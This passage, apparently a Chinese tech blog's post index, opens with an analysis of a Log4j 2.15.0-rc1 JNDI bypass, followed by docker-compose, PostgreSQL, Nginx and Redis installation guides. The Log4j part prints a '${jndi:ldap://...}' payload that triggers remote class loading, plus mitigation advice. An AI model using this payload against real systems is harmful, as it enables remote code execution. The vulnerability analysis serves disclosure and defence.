具体的解析代码如下，有兴趣可以自己去阅读一下源码： 满足如下条件既生成想要的类，也就是lookups这个为true，也就是loadLookups(options)这个方法里面当传入的options里面含有lookups字符串的时候返回true。 生成LookupMessagePatternConverter最终的调用链如下： 到此我们又成功用到了这个针对${}的解析，但是在进入JndiManager这个类的lookup里面发现前面加了很多东西，最终poc在下面红色框框的里面由于attributeMap中存在javaFactory这个key，导致直接return null，失败。 然后我看了一下log4j-2.15.0-rc2的修改，发现了一个点，他在代码提交中添加了如下代码，那就反向思维一下，log4j-2.15.0-rc1里面没有返回null，那我们只要让上面的new URI()这个方法爆出URISyntaxException这个异常并且不影响后面的使用就行，异常被捕获但是并未处理导致了这个绕过。 于是在原来的payload上面添加特殊字符绕过，poc如下logger.error(“${jndi:ldap://127.0.0.1:1389/Exploit/ }”); 到此结束，具体的利用过程就不发出来了，目前官方已经发布了2.15.0版本，大家及时更新。 全部调用链如下： poc测试代码地址：https://github.com/fireflyingup/log4j-poc安全建议1、排查应用是否引入了Apache log4j-core Jar包，若存在依赖引入，且在受影响版本范围内，则可能存在漏洞影响。请尽快升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0 版本，地址 https://logging.apache.org/log4j/2.x/download.html 2、升级已知受影响的应用及组件，如 spring-boot-starter-log4j2/Apache Struts2/Apache Solr/Apache Druid/Apache Flink 3、临时缓解方案。可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。对于大于2.10版本的Log4j，可设置 log4j2.formatMsgNoLookups 为 True，或者将 JndiLookup 类从 classpath 中去除，例如 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 希望大家守好安全不要做坏事。 参考链接https://xz.aliyun.com/t/10649#toc-3 https://help.aliyun.com/noticelist/articleid/1060971232.html https://logging.apache.org/log4j/2.x/ https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce","tags":["漏洞分析"],"categories":["漏洞分析"]},{"title":"记一次docker-compose的使用","path":"/2021/10/29/记一次docker-compose的使用/","content":"什么是docker-compose?英文解释： Docker Compose is a tool for running multi-container applications on Docker defined using the Compose file format. A Compose file is used to define how the one or more containers that make up your application are configured. Once you have a Compose file, you can create and start your application with a single command: docker compose up. 也就是说docker-compose是一个工具，通过一个定义的compose文件格式来运行docker上的多容器应用程序，Compose 文件用于定义构成应用程序的一个或多个容器的配置方式，可以通过docker-compose up来启动docker应用程序，所以说docker-compose是一个很好的docker管理docker的东西，下面讲一次docker-compose的一次使用。 项目分析这里将要搭建一个常用的项目架构，使用的环境如下 nginx:1.18.0 jdk:1.8 postgresql:10.4 redis:5.0.13 这是一个最基础的项目情况，首先流量进入nginx，nginx做反向代理把流量转发给我们的项目（这里取名叫做fire），然后fire可以访问pgsql和redis。 环境准备安装docker，命令如下通过yum安装docker 1yum install docker 使用service服务运行docker 1systemctl start docker 判断docker是否启动成功 1234567docker -v# 出现下面信息 # Docker version 1.13.1, build 7d71120/1.13.1# 或者docker ps # 出现# CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 安装docker-compose工具去docker-compose的github上下载对应的tag，这里我们选择v2.0.1 点进去选择自己对应的服务器或者电脑版本下载，这里我是linux-x86_64的。 下载完之后会发现下下来的直接就可以使用，我们修改一下名字，并放入/usr/bin/目录下，这样就可以直接使用命令了。 123mv docker-compose-linux-x86_64 docker-compose # 修改名字，这里下下来的是直接可以用的，已经编译好了mv docker-compose /usr/bin/ # 将docker-compose移到/usr/bin目录下docker-compose -v # 测试一下，出现Docker Compose version v2.0.1即为成功 docker-compose.yml文件编写文件如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758version: &#x27;3&#x27; #版本services: redis: image: docker.io/redis:5.0.13 # 镜像名称，不知道可以docker search redis搜索一下，然后填入版本号可以去官方仓库查看，地址：https://hub.docker.com/search?q=java&amp;type=image privileged: true # 这里很重要，因为我项目是部署在非root用户下面，所以在我运行的时候一直报权限不足，加了这个就好了 container_name: redis # 容器名称 restart: always # 每次重启自动启动 environment: - TZ=Asia/Shanghai # 使用上海时区 volumes: - $&#123;HOME&#125;/data/redis:/data # 挂载映射，冒号前面的是你服务器的路径，后面的是docker容器里面的路径，两边做了一个映射 ports: - 0.0.0.0:6379:6379 # 端口映射，将本机的6379端口和docker容器的6379端口做了映射，0.0.0.0表示端口对外开放，服务器外可以访问。 command: redis-server --requirepass 123456 # 执行的命令，--requirepass 设置密码为123456 postgres: image: docker.io/postgres:10.4 privileged: true container_name: postgres restart: always environment: - TZ=Asia/Shanghai - POSTGRES_DB=sca # 设置pgsql的数据库名称 - POSTGRES_USER=sca # 设置pgsql的用户名，他有一个默认用户postgres - POSTGRES_PASSWORD=sca # 设置pgsql的密码 ports: - 0.0.0.0:5432:5432 volumes: - $&#123;HOME&#125;/data/postgresql:/var/lib/postgresql/data nginx: image: docker.io/nginx:1.18.0 privileged: true volumes: - $&#123;HOME&#125;/config/nginx/conf/nginx.conf:/etc/nginx/nginx.conf - $&#123;HOME&#125;/app/html:/usr/share/nginx/html # 前端的静态文件存放在服务器的$&#123;HOME&#125;/app/html下，会自动映射进docker里面的/usr/share/nginx/html ports: - 0.0.0.0:80:80 container_name: nginx links: - fire depends_on: - fire # 表示依赖于fire这个项目 fire: image: openjdk:8-jdk-alpine container_name: fire privileged: true ports: - 0.0.0.0:8081:8081 environment: - TZ=Asia/Shanghai volumes: - $&#123;HOME&#125;/app/fire-service.jar:/app/fire-service.jar command: java -jar -Dspring.profiles.active=dev /app/fire-service.jar # -Dspring.profiles.active=dev指定dev环境运行 links: - postgres - redis depends_on: - postgres - redis # 表示依赖于postgresql和redis 这里有几个地方要说一下 第一个是privileged: true，这里是由于我是非root用户使用docker-compose的，所以他在docker容器里面使用路径的话会出现权限不够的情况，使用这个就解决了这个问题，但是有一个其他的问题就是在服务器映射创建出来的文件变成了root权限，这个还有待优化去解决。 第二个是我后面出现了一个问题，问题如下 1fire | Error: Invalid or corrupt jarfile /app/fire-service.jar 这个问题出现有很多种情况，比如你映射的docker容器里面的路径和你启动命令的路径不对，也就是volumns冒号后面的路径和你command里面java -jar启动的路径不对。 在这里我是一种特殊的情况，是因为我使用的是非root用户，而且我的volumes里面使用了${HOME}，所以外面被映射到了/root目录下，而不是我的/home/myName目录下，排查这个问题的心理路程如下。 首先我猜想是不是我的docker-compose.yml文件有没有错误，在我仔细万分的肉眼识别之下，我确定是没有问题的，那么排查我文件的错误。 然后我在确定我docker-compose.yml文件下的映射没问题的情况下，我想查看我容器里面的包是否正确，但是容器无法启动，我无法通过 docker exec -it 容器名 bash 命令进入我的容器，所以我得想办法进入我的容器或者输出我这个容器的映射文件，于是我构造了以下command。 1command: ls -l /app &amp; java -jar -Dspring.profiles.active=dev /app/fire-service.jar # 主要目的是打印出fire-service.jar文件的大小，看看是不是文件损坏或者其他原因 结果发现了如下打印 12fire | total 0fire | drwxr-xr-x 2 root root 6 Oct 28 22:06 fire-service.jar 看见这个文件的大小只有6B，明显不对，我在仔细看我的docker-compose文件，发现了问题点，原来我是root用户启动的docker-compose up命令，导致${HOME}取了/root的值，后来su myName切换到普通用户，就成功了 最终docker ps发现项目全部启动 最后说一下docker-compose的常用命令 123docker-compose up # 启动docker-compose up -d # 后台启动docker-compose down # 关闭","tags":["docker-compose"],"categories":["docker"]},{"title":"Linux源码编译安装PostgreSql","path":"/2021/09/24/Linux源码编译安装PostgreSql/","content":"1、下载postgresql百度或者谷歌搜索postgresql download 点进去就是postgresql的官方下载页面，页面如下 如果你知道你自己的系统是什么，那么你就去上面蓝色框中选择自己系统对应的来进行下载，当然不知道的话，比如说你是arm的系统，这时候就要在自己的系统上使用源码编译，不然是无法使用的，这里就是要进行源码编译，所以我们选择Source code下面的file browser，也就是上图中的红色框。 点进去可以看到有很多postgresql的版本，这里我们选择10.4版本进行安装。 点击v10.4进去下载对应的压缩文件 当然也可以使用wget命令 12wget https://ftp.postgresql.org/pub/source/v10.4/postgresql-10.4.tar.gz #下载tar -zxvf postgresql-10.4.tar.gz #解压 2、编译安装postgresql在编译之前我们要先对编译所需要的环境进行安装 安装readline 123yum install readline-devel #yum安装# 或者sudo apt-get install libreadline6-dev 不安装可能会出现如下错误 安装zlib 1yum install zlib-devel 进入解压好的文件夹里面执行编译命令 123cd postgresql-10.4./configure --prefix=/root/target/postgre #指定编译目标文件夹make &amp;&amp; make install 3、安装完成1234[root@QLL3-5 postgre]# lsbin include lib share[root@QLL3-5 postgre]# pwd/root/target/postgre","tags":["postgresql"],"categories":["安装"]},{"title":"Linux源码编译安装Nginx","path":"/2021/09/24/Linux源码编译安装Nginx/","content":"1、nginx下载整个安装步骤可以直接采用官方的安装文档 使用wget命令下载nginx，这里以nginx 1.18.0 版本为例 12wget https://nginx.org/download/nginx-1.18.0.tar.gz #下载tar -zxvf nginx-1.18.0.tar.gz #解压 或者去nginx官网下载页面下载安装包，页面如下 2、必要模块安装下载PCRE，PCRE - Supports regular expressions. Required by the NGINX Core and Rewrite modules. 12wget https://ftp.pcre.org/pub/pcre/pcre-8.44.tar.gz #下载tar -zxvf pcre-8.44.tar.gz #解压 下载zlib, zlib - Supports header compression. Required by the NGINX Gzip module. 12wget http://zlib.net/zlib-1.2.11.tar.gz #下载tar -zxvf zlib-1.2.11.tar.gz #解压 可以看到当前文件夹下面有以下文件 接下来我们依次进行编译 编译pcre-8.44 12cd pcre-8.44./configure 发现以下报错 原因是没有gcc-c++编译环境，输入以下命令 123yum install gcc-c++#完成安装之后继续编译pcre./configure 出现如下页面表示成功 接下来执行以下命令，即pcre编译完成。 1make &amp;&amp; make install 编译zlib，执行过程和pcre一致，在这里不再重复。 123cd zlib-1.2.11./configuremake &amp;&amp; make install 3、编译安装nginx进入nginx目录，这里我选择将nginx编译后放入/root/target/nginx目录下面，这个目录你们可以自行配置，参数介绍官方的安装文档有很详细的介绍，这里我不在介绍。 12cd nginx-1.18.0./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_module 在运行上述命令的时候我发现了另一个问题，这个是没有OpenSSL的环境。 我们执行以下命令来安装OpenSSL的环境 1yum -y install openssl openssl-devel 然后在继续执行就可以了 12./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_modulemake &amp;&amp; make install 这样nginx的源码编译安装就大功告成了，附上一个nginx编译完成的截图。 再附上一个安装到目标文件夹的截图。 最后说一句，刚开始我准备使用nginx-1.9.15，可是后来在使用./configure的时候遇见了各种问题，后来就按照官方文档使用了稳定的nginx-1.18.0。 参考链接： nginx官方文档：https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources 安装OpenSSL：https://blog.csdn.net/testcs_dn/article/details/51461999","tags":["nginx"],"categories":["安装"]},{"title":"Linux源码编译安装Redis","path":"/2021/09/24/Linux源码编译安装Redis/","content":"1、下载Redisredis版本：5.0.13 123wget https://download.redis.io/releases/redis-5.0.13.tar.gz #下载redistar -zxvf redis-5.0.13.tar.gz #解压cd redis-5.0.13 2、编译可以直接使用make &amp;&amp; make install，如果想要编译到指定文件夹的话，使用以下命令，注意一定要连在一起而且不能用&amp;&amp;，不然将不会编译到指定文件夹 1make CFLAGS=&quot;-g -O0&quot; PREFIX=/root/target/redis install 如果缺少gcc-c++环境的话，使用以下命令 1yum install gcc-c++ 3、编译完成可以看到最后在指定文件夹下面出现了bin文件夹，编译完成。 12345[root@QLL3-5 bin]# pwd/root/target/redis/bin[root@QLL3-5 bin]# lsredis-benchmark redis-check-aof redis-check-rdb redis-cli redis-sentinel redis-server[root@QLL3-5 bin]#","tags":["redis"],"categories":["安装"]}]